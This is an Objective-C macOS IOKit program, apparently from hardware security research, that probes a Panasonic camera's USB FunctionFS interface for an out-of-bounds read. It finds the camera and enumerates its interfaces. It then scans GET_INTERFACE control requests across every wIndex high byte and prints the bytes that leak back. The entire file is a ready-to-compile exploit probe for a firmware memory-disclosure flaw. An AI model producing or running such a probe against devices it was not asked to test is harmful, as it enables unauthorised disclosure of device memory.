// ffs_probe_io.m — S1M2 FunctionFS F2 越界读探测（原生 IOKit，只读）
// F2: GET_INTERFACE (bmRequestType=0x81, bRequest=0x0A, wValue=0, wIndex=0x0100*n, wLength=1)
// 编译: clang -fobjc-arc -framework Foundation -framework IOKit -o ffs_probe_io ffs_probe_io.m
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <IOKit/usb/IOUSBHostDevice.h>
#import <IOKit/usb/IOUSBHostInterface.h>

int main(void) {
    @autoreleasepool {
        // 1. 找 Panasonic 相机 (idVendor 0x04DA)
        CFMutableDictionaryRef m = IOServiceMatching("IOUSBHostDevice");
        io_iterator_t it = 0;
        if (IOServiceGetMatchingServices(kIOMainPortDefault, m, &it) != KERN_SUCCESS) return 2;
        io_service_t dev = 0;
        while ((dev = IOIteratorNext(it))) {
            NSNumber *vid = (__bridge_transfer NSNumber *)IORegistryEntryCreateCFProperty(dev, CFSTR("idVendor"), kCFAllocatorDefault, 0);
            NSNumber *pid = (__bridge_transfer NSNumber *)IORegistryEntryCreateCFProperty(dev, CFSTR("idProduct"), kCFAllocatorDefault, 0);
            NSString *name = (__bridge_transfer NSString *)IORegistryEntryCreateCFProperty(dev, CFSTR("USB Product Name"), kCFAllocatorDefault, 0);
            if (vid && vid.unsignedIntValue == 0x04DA) {
                printf("found %s vid=%04x pid=%04x (io_service=0x%x)\n", name.UTF8String ?: "?", vid.unsignedIntValue, pid.unsignedIntValue, dev);

                // 2. 枚举接口（IORegistry 子节点属性）
                io_iterator_t ifit = 0;
                IORegistryEntryGetChildIterator(dev, kIOServicePlane, &ifit);
                io_service_t iface = 0;
                while ((iface = IOIteratorNext(ifit))) {
                    NSNumber *cls = (__bridge_transfer NSNumber *)IORegistryEntryCreateCFProperty(iface, CFSTR("bInterfaceClass"), kCFAllocatorDefault, 0);
                    NSNumber *sub = (__bridge_transfer NSNumber *)IORegistryEntryCreateCFProperty(iface, CFSTR("bInterfaceSubClass"), kCFAllocatorDefault, 0);
                    NSNumber *num = (__bridge_transfer NSNumber *)IORegistryEntryCreateCFProperty(iface, CFSTR("bInterfaceNumber"), kCFAllocatorDefault, 0);
                    NSNumber *pro = (__bridge_transfer NSNumber *)IORegistryEntryCreateCFProperty(iface, CFSTR("bInterfaceProtocol"), kCFAllocatorDefault, 0);
                    NSString *iname = (__bridge_transfer NSString *)IORegistryEntryCreateCFProperty(iface, CFSTR("USB Interface Name"), kCFAllocatorDefault, 0);
                    if (cls) printf("  if%d: class=0x%02x sub=0x%02x proto=0x%02x %s\n",
                                    num ? num.intValue : -1, cls.intValue, sub.intValue, pro.intValue, iname.UTF8String ?: "");
                    IOObjectRelease(iface);
                }
                IOIteratorReset(ifit);

                // 3. 打开控制会话并扫描 F2
                io_connect_t conn = 0;
                kern_return_t kr = IOServiceOpen(dev, mach_task_self(), kIOUSBHostDeviceAccessTypeControl, &conn);
                printf("IOServiceOpen(control) = 0x%08x\n", kr);
                if (kr != KERN_SUCCESS) break;

                printf("\n=== F2 scan: GET_INTERFACE wIndex 0x0000..0xFF00 step 0x100 ===\n");
                int hits = 0;
                for (uint32_t wi = 0x0000; wi <= 0xFF00; wi += 0x100) {
                    uint8_t buf = 0xFF;
                    IOUSBDeviceRequest req = {
                        .bmRequestType = 0x81, .bRequest = 0x0A,
                        .wValue = 0, .wIndex = (uint16_t)wi,
                        .wLength = 1, .pData = &buf, .completionTimeout = 2000,
                    };
                    IOReturn r = IOUSBHostDeviceDeviceRequest(conn, &req);
                    if (r == kIOReturnSuccess) {
                        printf("0x%04x : 0x%02x\n", wi, buf);
                        hits++;
                    } else {
                        printf("0x%04x : err 0x%08x\n", wi, r);
                    }
                }
                printf("hits=%d\n", hits);
                IOServiceClose(conn);
                break;
            }
            IOObjectRelease(dev);
        }
        IOObjectRelease(it);
    }
    return 0;
}
